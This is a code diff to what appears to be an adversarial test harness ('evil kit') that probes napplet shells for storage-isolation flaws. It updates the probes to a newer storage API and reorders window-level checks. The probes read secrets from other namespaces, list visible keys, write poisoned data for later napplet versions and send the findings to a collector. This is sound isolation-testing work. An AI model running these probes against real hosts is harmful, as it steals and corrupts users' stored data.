@@ -126,6 +126,7 @@
   .chip.sev-critical { color: var(--danger); }
   .chip.sev-high { color: var(--warn); }
   .chip.sev-info { color: var(--muted); }
+  .chip.window-level { color: var(--muted); border-style: dashed; }
   .evidence {
     color: var(--muted);
     font-size: 11px;
@@ -449,6 +450,16 @@ window.__EVIL_KIT__ = [
   },
 ];
 
+// NAP-STORAGE (napplet/naps#3) names the injected methods getItem/setItem/
+// removeItem/keys (getItem → null on a miss). A shell exposing only the
+// pre-spec get/set/remove gets an explicit na naming that shape instead of a
+// TypeError mid-probe; the wire (storage.get/.set/.remove/.keys) is unchanged.
+function preSpecStorage(st) {
+  if (typeof st.getItem === 'function') return null;
+  const legacy = ['get', 'set', 'remove'].filter((k) => typeof st[k] === 'function');
+  return 'storage domain is not NAP-STORAGE shaped (no getItem' + (legacy.length ? '; pre-spec ' + legacy.join('/') + ' only' : '') + ') — probe not run';
+}
+
 const ATTACKS = [
   {
     id: 'inherited-storage',
@@ -460,12 +471,16 @@ const ATTACKS = [
     async demo() {
       const st = window.napplet && window.napplet.storage;
       if (!st) return na('no injected storage domain — no namespace to inherit (inheritance channel absent, nothing to steal)');
+      const gap = preSpecStorage(st);
+      if (gap) return na(gap);
       try {
-        const v = await withTimeout(st.get('__evil05_secret__'), 3000);
+        const v = await withTimeout(st.getItem('__evil05_secret__'), 3000);
+        const ks = typeof st.keys === 'function' ? await withTimeout(st.keys(), 1500) : null;
+        const seen = Array.isArray(ks) ? ' · keys() lists ' + ks.length + ' visible key(s)' : '';
         if (v && v !== 'timeout' && !(v && v.__rejected)) {
-          return armed('INHERITED ' + JSON.stringify(mask(v, 24)) + ' from a PREDECESSOR/VICTIM namespace — storage is shared across artifact identity: substitution = full stored-data theft');
+          return armed('INHERITED ' + JSON.stringify(mask(v, 24)) + ' from a PREDECESSOR/VICTIM namespace — storage is shared across artifact identity: substitution = full stored-data theft' + seen);
         }
-        return blocked('namespace is isolated — no inherited secret visible (storage bound to artifact identity, substitution gains nothing)');
+        return blocked('namespace is isolated — no inherited secret visible (storage bound to artifact identity, substitution gains nothing)' + seen);
       } catch (e) {
         const m = errMsg(e);
         if (/no such|not found|timeout/i.test(m)) {
@@ -478,19 +493,25 @@ const ATTACKS = [
       const st = window.napplet && window.napplet.storage;
       const out = {};
       if (!st) { out.error = 'no injected storage domain'; return out; }
+      const gap = preSpecStorage(st);
+      if (gap) { out.error = gap; return out; }
       const keys = [];
       try {
-        const secret = await withTimeout(st.get('__evil05_secret__'), 3000);
+        const listed = typeof st.keys === 'function' ? await withTimeout(st.keys(), 1500) : null;
+        if (Array.isArray(listed)) out.visibleKeys = listed.slice(0, 64);
+      } catch (e) { out.keysError = errMsg(e); }
+      try {
+        const secret = await withTimeout(st.getItem('__evil05_secret__'), 3000);
         if (secret && secret !== 'timeout' && !secret.__rejected) {
           out.inheritedSecret = String(secret);
           keys.push('__evil05_secret__');
         }
       } catch (e) { out.getError = errMsg(e); }
       try {
-        await st.set('__evil05_poison__', 'attacker-data-for-the-next-heir');
+        await st.setItem('__evil05_poison__', 'attacker-data-for-the-next-heir');
         out.poisoned = '__evil05_poison__ written into the shared namespace — the NEXT napplet version (or the returned legit napplet) inherits it';
       } catch (e) { out.setError = errMsg(e); }
-      out.exfil = await sendToCollector('substitution-inheritance', { inherited: out.inheritedSecret || null, keys: keys });
+      out.exfil = await sendToCollector('substitution-inheritance', { inherited: out.inheritedSecret || null, keys: keys, visibleKeys: out.visibleKeys || null });
       return out;
     },
   },
@@ -503,11 +524,13 @@ const ATTACKS = [
     async demo() {
       const st = window.napplet && window.napplet.storage;
       if (!st) return na('no injected storage domain');
+      const gap = preSpecStorage(st);
+      if (gap) return na(gap);
       const markers = ['__evil03_spoof_trap__', '__evil04_kit_xss__', '__evil05_cross__'];
       const found = [];
       for (const k of markers) {
         try {
-          const v = await withTimeout(st.get(k), 1200);
+          const v = await withTimeout(st.getItem(k), 1200);
           if (v && v !== 'timeout' && !v.__rejected) found.push(k + '=' + mask(v, 12));
         } catch (_) { /* not visible */ }
       }
@@ -519,9 +542,10 @@ const ATTACKS = [
       const st = window.napplet && window.napplet.storage;
       const out = { found: [] };
       if (!st) { out.error = 'no injected storage domain'; return out; }
+      if (preSpecStorage(st)) { out.error = preSpecStorage(st); return out; }
       for (const k of ['__evil05_secret__', '__evil06_seeded__', '__harness_canary__']) {
         try {
-          const v = await withTimeout(st.get(k), 1500);
+          const v = await withTimeout(st.getItem(k), 1500);
           if (v && v !== 'timeout' && !v.__rejected) out.found.push({ key: k, value: mask(v, 32) });
         } catch (_) { /* skip */ }
       }
@@ -567,12 +591,14 @@ const ATTACKS = [
       const div = document.createElement('div');
       div.className = 'attack' + (r.status === 'armed' || r.status === 'sent' ? ' ' + r.status : '');
       div.dataset.attack = a.id;
+      if (a.windowLevel) div.dataset.windowLevel = '1';
       div.dataset.status = r.status || (a.autoRun === false ? 'ready' : 'pending');
       div.innerHTML =
         '<div class="attack-head">' +
           statusChip(r.status) +
           '<span class="attack-name">' + esc(a.name) + '</span>' +
           sevChip(a.severity) +
+          (a.windowLevel ? '<span class="chip window-level" title="posts a window-level message to the parent: runs last in the sweep (a port-bound NIP-5D shell may revoke on it)">window-level</span>' : '') +
           '<span class="spacer"></span>' +
           '<div class="row-actions"><button data-probe="' + a.id + '" type="button">' + (a.autoRun === false ? 'detonate' : 'probe') + '</button></div>' +
         '</div>' +
@@ -634,8 +660,26 @@ const ATTACKS = [
     render();
     updateReport();
   }
+  /* window-level rows (windowLevel: true) post a message to the parent
+     Window instead of riding the injected API / napplet.hello port. A
+     port-bound NIP-5D shell may treat that as replacement evidence and revoke
+     (tearing this frame down), so the sweep runs them LAST, or not at all
+     with evil-window-level=skip (napplet/evil#3). Manual probes still run. */
+  function windowLevelMode() {
+    const v = String(evilParam('evil-window-level') || '').trim().toLowerCase();
+    return v === 'skip' ? 'skip' : 'last';
+  }
   async function runAllDemos() {
-    for (const a of ATTACKS) if (a.autoRun !== false) await runDemo(a.id);
+    const auto = ATTACKS.filter((a) => a.autoRun !== false);
+    const late = auto.filter((a) => a.windowLevel);
+    if (windowLevelMode() === 'skip') {
+      for (const a of late) state.results[a.id] = na('skipped: window-level probe (evil-window-level=skip) — a port-bound NIP-5D shell may revoke on it; use the probe button to run it');
+      render();
+      updateReport();
+    }
+    for (const a of auto) if (!a.windowLevel) await runDemo(a.id);
+    if (windowLevelMode() === 'skip') return;
+    for (const a of late) await runDemo(a.id);
   }
 
   /* ---------- VERY EVIL ---------- */
